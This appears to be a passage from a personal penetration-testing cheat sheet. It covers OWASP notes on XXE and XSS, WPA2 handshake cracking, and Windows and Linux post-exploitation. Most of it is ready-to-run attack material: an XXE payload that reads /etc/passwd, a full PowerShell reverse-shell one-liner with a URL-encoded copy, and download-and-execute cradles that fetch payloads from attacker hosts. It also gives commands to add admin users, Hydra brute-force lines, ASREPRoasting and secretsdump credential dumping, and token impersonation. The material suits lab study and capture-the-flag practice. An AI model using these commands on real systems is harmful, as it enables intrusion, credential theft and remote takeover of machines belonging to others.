		| https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)
		| Attacking systems that parse XML input | Abuse SYSTEM entity and get malicous | Attacks include denial of service, local file disclosure, remote code execution, much more
			| "Normal"
			| <?xml version="1.0" encoding="ISO-8859-1"?>
			| <!DOCTYPE gift [
			|		<!ENTITIY> from "Nick">
			| ]>
			| 
			| <gift>
			| 		<To>Deckard</To>
			|		<From>&from;</From>
			|		<Item>SoJ</Item>
			|
			| </gift>
			 
			| "Malicious" - Tries to pull the etc/passwd file
			| <?xml version="1.0" encoding="ISO-8859-1"?>
			|   <!DOCTYPE foo [  
			|   <!ELEMENT foo ANY >
			|   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>


		| Steps	
		| Save Malicous as something.xml
		| Find a file upload location on a website
		| Turn intercepter on in Burpsuite > send to repeater > monitor if something needs to be tweaked
		| Upload XML file
		| Navigate to uploaded file to run the malicious code


	5 - Broken Access Control
		| https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
		| Example - Leave Feedback page
		| Inspect element
		| Search/look for <input>
			| See if anything has "hidden"
			| Delete hidden section
			| See that our ID for "Author" or "email" etc is "18"
			| Change to 17 or 3 etc
			
	6 - Security Misconfiguration
		| https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration
		| Default usernames/passwords
		| File upload expects pdf or txt but you can upload an exe docx etc

	7 - Cross-Site Scripting (XSS)
		| https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)
		| https://xss-game.appspot.com
		| 3 Types
			| Reflected XSS - The application or API includes unvalidated and unescaped user input as part of HTML output. A successful attack can allow the attacker to execute arbitrary HTML and JavaScript in the victim’s browser. Typically the user will need to interact with some malicious link that points to an attacker-controlled page, such as malicious watering hole websites, advertisements, or similar.
				 index.php
				 
				 <?php
				 $username = $_GET['username']
				 echo "Hi $username!";
				 ?>
				 index.php?username=deckard         	--- Regular php
				 Hi deckard!
				 
				 index.php?=<script>alert(1)</script> 	--- Reflected XSS
			
			
			
			
			
			
			
			
			| Stored XSS - The application or API stores unsanitized user input that is viewed at a later time by another user or an administrator. Stored XSS is often considered a high or critical risk.
				| Leave the page and come back and it is still there
				
			| DOM XSS - JavaScript frameworks, single-page applications, and APIs that dynamically include attacker-controllable data to a page are vulnerable to DOM XSS. Ideally, the application would not send attacker-controllable data to unsafe JavaScript APIs.
						Typical XSS attacks include session stealing, account takeover, MFA bypass, DOM node replacement or defacement (such as trojan login panels), attacks against the user’s browser such as malicious software downloads, key logging, and other client-side attacks.
				| https://www.scip.ch/en/?labs.20171214

		| PREVENTTION / MITIGATION
			| Encoding = < becomes &lt;
						 <script> becomes &lt;script>
			| Filtering = <script> becomes script
			| Validating = Compares input against a whitelist
			| Sanitation = Combination of encoding, filtering, and validation

	8 - Insecure Deserialization
		| https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization.html
		
	
	9 - Using Components with Known Vulnerabilities
		| https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities
		

	10 - Insufficient Logging & Monitoring
		| https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring
		



==========================================
=======WIRELESS PENETRATION TESTING=======
==========================================

	| WPA2/PSK | WPA2/Enterprise
		Evaluating strength of PSK, Reviewing Nearby Networks, Assessing Guest Networks, Checking Network Access
	
	| Hacking Process
		| Place
			| Place wireless card into monitor mode
		| Discover
			| Discover information about the network
		| Select
			| Select network and capture data
		| Perform	
			| Perform deauth attack
		| Capture
			| Capture WPA handshake
		| Attempt
			| Attempt to crack the handshake


		| Connect to wireless card
			| confirm with iwconfig
		| airmon-ng check kill
		| airmon-ng start wlan0
			| confirm with iwconfig - should see wlan0mon
		| airodump-ng wlan0mon
			| airodump-ng -c % --bssid ##:##:##:##:##:## -w capture wlan0mon
			| aireplay-ng -0 1 ##:##:##:##:##:## -c Station ##:##:##:##:##:## wlan0mon  | might have to run multiple times against multiple clients
			| aircrack-ng -w wordlist.txt -b ##:##:##:##:##:## capture##.cap
			

==========================================
==========================================
==========================================
==========================================
==========================================





POWERSHELL REVERSE SHELL ONE-LINER:
	| Replace IP/PORT
	| powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
	| URL-Encoded:
	| powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27**\<IP>**%27%2C**\<PORT>**%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22


CREATING / ADDING USERS TO WINDOWS MACHINES WITH ADMIN PRIVS
	| net user <username> <password> /add
	| net localgroup administrators <username> add

UTILIZING / CREATING SSH KEY PAIRS
	| ssh-keygen > creates key pairs
	
FIND COMMAND
	| find / -type f -name "*.bak" 2>/dev/null
	| find / -perm -u=s -type f 2>/dev/null
	| find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
	
CONNECT USING RDP
	| xfreerdp /u:user /p:password /cert:ignore /v:MACHINE_IP
	
TRANSFER FILES FROM LINUX SMBSERVER TO WINDOWS 
	| Attacker:
	| python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
	| Target:
	| copy \\xxx.xxx.xxx.xxx\kali\SomeFile.exe C:\SomeDir\SomeFile.exe
	
REVERSE ENGINEERING
	| Program : radare2
		| r2 -d ./file 
			| aa : most common analysis mode : can take a long time
			| afl | grep main : Find the list of functions
			| pdf @main : Print Disassembly Function
			| db 0x000xxxxxxx : set breakpoint at that register
			| pdf @main : To verify breakpoint. Should see "b" next to register with breakpoint
			| dc : wille execute the program until said breakpoint
			| pdf : Print main function : Notice the ' ;-- rip: '
			| ds : executes to the next instruction (only the next one)
			| px @<memory-address> : Show value in memory

				| 64 bit	32 bit
				| %rax		%eax
				| %rbx		%ebx
				| %rcx		%ecx
				| %rdx		%edx
				| %rsi		%esi
				| %rdi		%edi
				| %rsp		%esp
				| %rbp		%ebp
				| %r8		%r8d
				| %r9		%r9d
				| %r10		%r10d
				| %r11		%r11d
				| %r12		%r12d
				| %r13		%r13d
				| %r14		%r14d
				| %r15		%r15d
				
				| Intel Data Type		Suffix	Size(bytes)
				| Byte					b		1
				| Word					w		2
				| Double Word			l		4
				| Quad Word				q		8
				| Single Precision		s		4
				| Double Precision		l		8
				
			| When dealing with memory manipulation using registers, there are other cases to be considered:
				| (Rb, Ri) = MemoryLocation[Rb + Ri]
				| D(Rb, Ri) = MemoryLocation[Rb + Ri + D]
				| (Rb, Ri, S) = MemoryLocation(Rb + S * Ri]
				| D(Rb, Ri, S) = MemoryLocation[Rb + S * Ri + D]

			| Some other important instructions are:
				| leaq source, destination: this instruction sets destination to the address denoted by the expression in source
				| addq source, destination: destination = destination + source
				| subq source, destination: destination = destination - source
				| imulq source, destination: destination = destination * source
				| salq source, destination: destination = destination << source where << is the left bit shifting operator
				| sarq source, destination: destination = destination >> source where >> is the right bit shifting operator
				| xorq source, destination: destination = destination XOR source
				| andq source, destination: destination = destination & source
				| orq source, destination: destination = destination | source

			| See notes in Cheatsheet folder



METERPRETER PRIVESC
	| POWERSHELL (POWERUP.PS1)
		| upload PowerUp.ps1
		| load powershell
		| powershell_shell
		| . .\PowerUp.ps1
		| Invoke-AllChecks

		| Check for 'Can restart'
		| use msfvenom to create a reverse shell
		| upload reverse.exe to target
		| sc stop <service path name>
		| copy exploit to folder containing targetable service (exe) (Replacing file)
		| sc start <service path name> : restarts the service
		
		
		| powershell -c "Invoke-WebRequest http://10.13.4.180/winPEAS.exe -OutFile winPEAS.exe"


WEB CLI REVERSE TCP/IP/PORT
	| powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
	| Create msfvenom encoded-reverse shell : msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
	| powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
	| msfconsole
		| load incognito
		| list_tokens -g 
		| impersonate_token "BUILTIN\Administrators"
		| migrate to process 672 (services.exe process) (stabilize shell

HYDRA EXAMPLES
	| Web App Login
	| hydra -l <username> -P /opt/wordlists/rockyou.txt 10.10.xxx.xxx http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -V -I
	| 																			^^^^^^ Login URL page
	| SSH Login
	| hydra -l <username> -P /opt/wordlists/rockyou.txt 10.10.xxx.xxx -t 4 ssh
	|
	| hydra -l <username> -P /opt/wordlists/rockyou.txt 10.10.xxx.xxx pop3 -s 55007 -f -V
	| 		 ^ Specific User ^ Password list				^ IP 	   ^ Service ^ Custom port ^ Close on success 

WPS SCAN : WORDPRESS Scan
	Basic Scan
	| wpscan --url http://10.10.xxx.xxx
	Enumerate Users
	| wpscan --url http://10.10.xxx.xxx --enumerate u 
	
	Malicious Wordpress Plugin 
	| https://github.com/wetw0rk/malicious-wordpress-plugin

Enum4linux : SMB / Windows / Samba enumeration
	| enum4linux -S 10.10.xxx.xxx : Get share list
	| enum4linux -a 10.10.xxx.xxx : Do all simple enumeration

Kerbrute : Kerberose brute force attack / enumeration
	| ./kerbrute userenum --dc 10.10.xxx.xxx -d spookysec.local userlist.txt  : Enumerate a valid list of users on the domain
	|			  ^mode      ^ DC IP            ^ domain            ^ Users wordlist

GetNPUsers.py : Impacket module to get user accounts that "Do not require Pre-Authentication" ( ASREPRoasting ) 
	| GetNPUsers.py -no-pass -dc-ip 10.10.146.128 spookysec.local/svc-admin

Smbclient : Enumerate SMB shares
	| smbclient -L 10.10.xxx.xxx -U <username>
	
Secretsdump.py : Dump secrets from a remote machine ( Windows )
	| secretsdump.py -just-dc <username>:<password>@10.10.xxx.xxx

Evil-WinRM : Windows Remote Management shell for hacking / pentesting ( DO NOT USE WITH PRIVATE VPN ::: ONLY WITH THM / HTB VPN )
	| evil-winrm -i 10.10.xxx.xxx -u <user> -H <hash>

Print a specific line in a file
	| sed 'linenumber!d' somefile.txt
	
MySQL 
	| Connect remotely
	| mysql -h <ip> -uUSERNAME -pPASSWORD
	| show databases;
	| show <database>;
	| show tables;
	| select * from <table>;
	
PGP / GPG 
	| gpg -d some.file.gpg : Decrypts file. Might need passphrase
	
	To generate a private key we use the following command (8912 creates the key 8912 bits long):
    | openssl genrsa -aes256 -out private.key 8912

	To generate a public key we use our previously generated private key:
    | openssl rsa -in private.key -pubout -out public.key

	Lets now encrypt a file (plaintext.txt) using our public key:
    | openssl rsautl -encrypt -pubin -inkey public.key -in plaintext.txt -out encrypted.txt

	Now, if we use our private key, we can decrypt the file and get the original message:
    | openssl rsautl -decrypt -inkey private.key -in encrypted.txt -out plaintext.txt

POP3 With Netcat
	| nc <ip> 110
		| user <user> : Login UserName
		| pass <pass> : Login Password
		| list : List messages
		| retr <#> : Read message <#>